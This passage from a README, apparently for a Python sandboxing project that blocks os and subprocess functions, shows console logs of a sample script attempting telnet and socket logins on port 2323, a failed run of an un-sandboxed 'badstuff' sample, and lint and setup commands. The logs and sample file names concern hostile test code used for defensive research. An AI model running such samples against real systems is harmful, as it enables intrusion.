        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=0 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]

    
    Stop it with: ``ctrl + c``
    
#.  Verify the Target Python Server received the socket command

    ::

        2018-01-01T08:04:47.254433 received msg=2 data=b'This could be an incoming exploit attack here' replying
    
    Stop it with: ``ctrl + c``

#.  Run the Original, Non-Nerfed Version

    ::

        (venv) root:/opt/nerfball# python /opt/badstuff/mod_plaintext.py 
        os._get_exports_list=posix
        os._exists name=_have_functions
        os._add function label=HAVE_FUTIMESAT fn=utime
        os._add function label=HAVE_FUTIMENS fn=utime
        os._add function label=HAVE_FUTIMES fn=utime
        os._add function label=HAVE_LUTIMES fn=utime
        os._add function label=HAVE_UTIMENSAT fn=utime
        os._exists name=fork
        os._exists name=spawnv
        os._exists name=execv
        os._exists name=spawnv
        os._exists name=spawnvp
        os._exists name=fspath
        File "/opt/badstuff/mod_plaintext.py", line 6913
        print "Debug: Skipping sock close due to keepalive"
        ^
        SyntaxError: Missing parentheses in call to 'print'. Did you mean print(t "Debug: Skipping sock close due to keepalive")?
        (venv) root:/opt/nerfball# 

Linting
-------

::

    pycodestyle --max-line-length=160 --exclude=venv,build,.tox,./badstuff/debug_internet_chemo.py,./nerfball/os.py,./nerfball/3_6_os.py,./nerfball/nerfed_3_6_os.py,./badstuff/py3_internet_chemo.py,./nerfball/importlib/machinery.py

Development
-----------

If you want to use python 3:

::

    deactivate; rm -rf ./nerfball/../venv; virtualenv -p python3 venv && source venv/bin/activate && pip install -e . && nerf-virtualenv.sh venv/bin/python && python -m unittest tests/test_os_module.py && export NERF_OS_POPEN=0 && export NERF_OS_REMOVE=0 && export NERF_SUBPROCESS_CALL=1 && python setup.py test

License
-------

Apache 2.0 - Please refer to the LICENSE_ for more details

.. _License: https://github.com/jay-johnson/nerfball/blob/master/LICENSE

